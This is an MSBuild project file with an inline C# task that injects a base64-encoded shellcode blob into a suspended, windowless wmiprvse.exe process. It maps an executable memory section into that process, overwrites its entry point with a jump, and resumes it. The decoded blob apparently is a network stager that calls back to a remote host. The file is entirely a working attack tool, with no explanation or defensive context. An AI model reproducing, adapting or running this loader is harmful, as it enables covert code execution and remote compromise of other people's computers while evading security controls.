<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="msbuildtask">
    <msbuildtask/>
  </Target>
  <UsingTask
    TaskName="msbuildtask"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
    
      <Code Type="Class" Language="cs">
      <![CDATA[
    using System;
using System.Net;
using System.IO;
using System.Collections;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
public class msbuildtask : Task, ITask
{

    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const uint PAGE_READWRITE = 0x04;
    private const uint PAGE_EXECUTE_READ = 0x20;
    private const uint MEM_COMMIT = 0x00001000;
    private const uint SecCommit = 0x08000000;
    private const uint GenericAll = 0x10000000;
    private const uint CreateSuspended = 0x00000004;
    private const uint DetachedProcess = 0x00000008;
    private const uint CreateNoWindow = 0x08000000;
    private static bool x64flag = true;
    private static bool useCOM = true;
   
   
    private static string PROCNAME = "wmiprvse.exe";

    IntPtr section_;
    IntPtr localmap_;
    IntPtr remotemap_;
    IntPtr localsize_;
    IntPtr remotesize_;
    IntPtr pModBase_;
    IntPtr pEntry_;
    uint size_;

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1;
        public IntPtr PebAddress;
        public IntPtr Reserved2;
        public IntPtr Reserved3;
        public IntPtr UniquePid;
        public IntPtr MoreReserved;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct STARTUPINFO
    {
        uint cb;
        IntPtr lpReserved;
        IntPtr lpDesktop;
        IntPtr lpTitle;
        uint dwX;
        uint dwY;
        uint dwXSize;
        uint dwYSize;
        uint dwXCountChars;
        uint dwYCountChars;
        uint dwFillAttributes;
        uint dwFlags;
        ushort wShowWindow;
        ushort cbReserved;
        IntPtr lpReserved2;
        IntPtr hStdInput;
        IntPtr hStdOutput;
        IntPtr hStdErr;
    }

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    private static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    private static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);

    [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
    private static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);

    [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
    private static extern void CloseHandle(IntPtr handle);

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    private static extern int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);

    [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
    private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

    [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
    private static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, ref UInt32 lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint ResumeThread(IntPtr hThread);

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);


    [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten);


    [DllImport("kernel32.dll")]
    private static extern uint GetLastError();

    [StructLayout(LayoutKind.Sequential)]
    private struct SYSTEM_INFO
    {
        public uint dwOem;
        public uint dwPageSize;
        public IntPtr lpMinAppAddress;
        public IntPtr lpMaxAppAddress;
        public IntPtr dwActiveProcMask;
        public uint dwNumProcs;
        public uint dwProcType;
        public uint dwAllocGranularity;
        public ushort wProcLevel;
        public ushort wProcRevision;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct LARGE_INTEGER
    {
        public uint LowPart;
        public int HighPart;
    }

    private static bool IsX64()
    {
        return (IntPtr.Size == 8);
    }

    private void Info(string msg)
    {
#if DBGOUTPUT
        Console.WriteLine("[+] " + msg);
#endif
    }

    private void Alert(string msg)
    {
        Console.WriteLine("[-] " + msg);
    }
   
    private static bool Cleanup(string[] paths)
    {
        foreach (string path in paths)
        {
            if (File.Exists(path))
            {
                try
                {
                    File.Delete(path);
                }
                catch
                {
                   
                    return false;
                }
            }
        }
        return true;
    }

    private uint round_to_page(uint size)
    {
        SYSTEM_INFO info = new SYSTEM_INFO();

        GetSystemInfo(ref info);

        return (info.dwPageSize - size % info.dwPageSize) + size;
    }

    private const int AttributeSize = 24;

    private bool nt_success(long v)
    {
        return (v >= 0);
    }

    private IntPtr GetCurrent()
    {
        return GetCurrentProcess();
    }


    private KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr addr)
    {
        IntPtr baseAddr = addr;
        IntPtr viewSize = (IntPtr)size_;


        var status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);

        if (!nt_success(status))
        {
            Alert("MapViewOfSection failed with status: " + status);
            throw new SystemException();
        }


        return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
    }


    private bool CreateSection(uint size)
    {
        LARGE_INTEGER liVal = new LARGE_INTEGER();
        size_ = round_to_page(size);
        liVal.LowPart = size_;

        var status = ZwCreateSection(ref section_, GenericAll, (IntPtr)0, ref liVal, PAGE_EXECUTE_READWRITE, SecCommit, (IntPtr)0);

        return nt_success(status);
    }


    private void SetLocalSection(uint size)
    {

        var vals = MapSection(GetCurrent(), PAGE_EXECUTE_READWRITE, IntPtr.Zero);
        if (vals.Key == (IntPtr)0)
        {
            Alert("Failed to map view of section!");
            throw new SystemException();
        }

        localmap_ = vals.Key;
        localsize_ = vals.Value;

    }


    private PROCESS_INFORMATION StartProcess(string path)
    {
        STARTUPINFO startInfo = new STARTUPINFO();
        PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();

        uint flags = CreateSuspended | DetachedProcess | CreateNoWindow;

        if (!CreateProcess((IntPtr)0, path, (IntPtr)0, (IntPtr)0, true, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo))
        {
            Alert("Failed to create process!");
            throw new SystemException();
        }



        return procInfo;
    }

    private const ulong PatchSize = 0x10;


    private KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
    {
        IntPtr ptr;

        ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);

        List<Byte> trampoline = new List<byte>();
        byte[] dest_bytes;
        if (x64flag)
        {
            trampoline.Add(0x48);
            trampoline.Add(0xb8);
            dest_bytes = BitConverter.GetBytes((UInt64)dest);
        }
        else
        {
           
            trampoline.Add(0xb8);
            dest_bytes = BitConverter.GetBytes((UInt32)dest);
        }

        foreach (byte b in dest_bytes)
        {
            trampoline.Add(b);
        }
        trampoline.Add(0xff);
        trampoline.Add(0xe0);
        byte[] bytes = trampoline.ToArray();
        Marshal.Copy(bytes, 0, ptr, bytes.Length);

        return new KeyValuePair<int, IntPtr>(bytes.Length, ptr);
    }



    private IntPtr GetEntryFromBuffer(byte[] buf)
    {
        IntPtr res = IntPtr.Zero;
        var reader = new BinaryReader(new MemoryStream(buf));
        reader.BaseStream.Seek(0x3c, 0);
        uint e_lfanew_offset = reader.ReadUInt32();
       
        uint opthdr = e_lfanew_offset + 0x18;
        uint entry_ptr = opthdr + 0x10;
       
        reader.BaseStream.Seek(entry_ptr, 0);
        uint rvaEntryOffset_ = reader.ReadUInt32();
       
        if (x64flag)
        {
            res = (IntPtr)(pModBase_.ToInt64() + rvaEntryOffset_);
        }
        else
        {
            res = (IntPtr)(pModBase_.ToInt32() + rvaEntryOffset_);
        }
        Info("Entry point to patch at: 0x" + res.ToString("X"));

        pEntry_ = res;
        return res;
    }


    private IntPtr FindEntry(IntPtr hProc)
    {
        byte[] entryBuffer = new byte[0x1000];
        var basicInfo = new PROCESS_BASIC_INFORMATION();
        uint tmp = 0;

        var success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
        if (!nt_success(success))
        {
            Alert("Failed to get process information!");
            throw new SystemException();
        }

        IntPtr readLoc = IntPtr.Zero;
        var addrBuf = new byte[IntPtr.Size];
        if (IntPtr.Size == 4)
        {
            readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
        }
        else
        {
            readLoc = (IntPtr)((Int64)basicInfo.PebAddress + 16);
        }

        IntPtr nRead = IntPtr.Zero;

        if (!ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead) || nRead == IntPtr.Zero)
        {
            Alert("Failed to read process memory!");
            throw new SystemException();
        }

        if (IntPtr.Size == 4)
            readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
        else
            readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

        pModBase_ = readLoc;
        if (!ReadProcessMemory(hProc, readLoc, entryBuffer, entryBuffer.Length, out nRead) || nRead == IntPtr.Zero)
        {
            Alert("Failed to read module start!");
            throw new SystemException();
        }

        return GetEntryFromBuffer(entryBuffer);
    }

    private IntPtr GetBuffer()
    {
        return localmap_;
    }


    private void Load(byte[] shellcode)
    {

        Info("Starting suspended process " + PROCNAME);
        var pInfo = StartProcess(PROCNAME);
        FindEntry(pInfo.hProcess);

        Info("Creating new section");
        if (!CreateSection((uint)shellcode.Length))
        {
            Alert("Failed to create mapping");
            throw new SystemException();
        }

        SetLocalSection((uint)shellcode.Length);

        Info("Copying shellcode in section");
        Marshal.Copy(shellcode, 0, localmap_, shellcode.Length);

        UInt32 oldprot = 0;
        if (!VirtualProtect(localmap_, (UInt32)shellcode.Length, PAGE_EXECUTE_READ, ref oldprot))
        {
            Alert("VirtualProtect failed. Error: " + GetLastError());
            throw new SystemException();
        }

        Info("Mapping section to process");
        var tmp = MapSection(pInfo.hProcess, PAGE_EXECUTE_READ, IntPtr.Zero);
        if (tmp.Key == (IntPtr)0 || tmp.Value == (IntPtr)0)
        {
            Alert("Failed to map section into target process!");
            throw new SystemException();
        }

        remotemap_ = tmp.Key;
        remotesize_ = tmp.Value;
        Info("Shellcode mapped at 0x" + remotemap_.ToString("X"));
        var patch = BuildEntryPatch(tmp.Key);

        Info("Patching process entry");
        try
        {

            var pSize = (IntPtr)patch.Key;
            IntPtr tPtr = new IntPtr();

            if (!WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr) || tPtr == IntPtr.Zero)
            {
                Alert("Failed to write patch to start location! " + GetLastError());
                throw new SystemException();
            }

        }
        finally
        {
            if (patch.Value != IntPtr.Zero)
                Marshal.FreeHGlobal(patch.Value);
        }

        var tbuf = new byte[0x1000];
        var nRead = new IntPtr();
        if (!ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead))
            throw new SystemException("Failed!");

        Info("Resuming process PID " + pInfo.dwProcessId);
        var res = ResumeThread(pInfo.hThread);
        if (res == unchecked((uint)-1))
        {
            Alert("Failed to restart thread!");
            throw new SystemException();
        }

        CloseHandle(pInfo.hThread);
        CloseHandle(pInfo.hProcess);

        if (localmap_ != (IntPtr)0)
            ZwUnmapViewOfSection(section_, localmap_);
    }

    public bool Execute(string[] args)
    {
        try
        {
            PROCNAME = args[1];
            if (args.Length > 2 && ! args[2].Equals("0"))
            {
                useCOM = true;
            }
            else
            {
                useCOM = false;
            }
        }
        catch
        {
        }
        return Execute();
    }

    public override bool Execute()
    {
        x64flag = IsX64();
        if (x64flag)
            Info("Running in x64 process");
        else
            Info("Running in x86 process");

		string b64 = "/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqAAqaAIAAbyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vwtaJWagBT/9U=";
        byte[] shellcode = System.Convert.FromBase64String(b64);
        try
        {
            Load(shellcode);
        }
        catch (Exception e)
        {
            Console.WriteLine("Something went wrong! " + e.Message);
            return false;
        }

        Info("Process Injection terminated successfully, exiting");
        return true;
    }
}
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
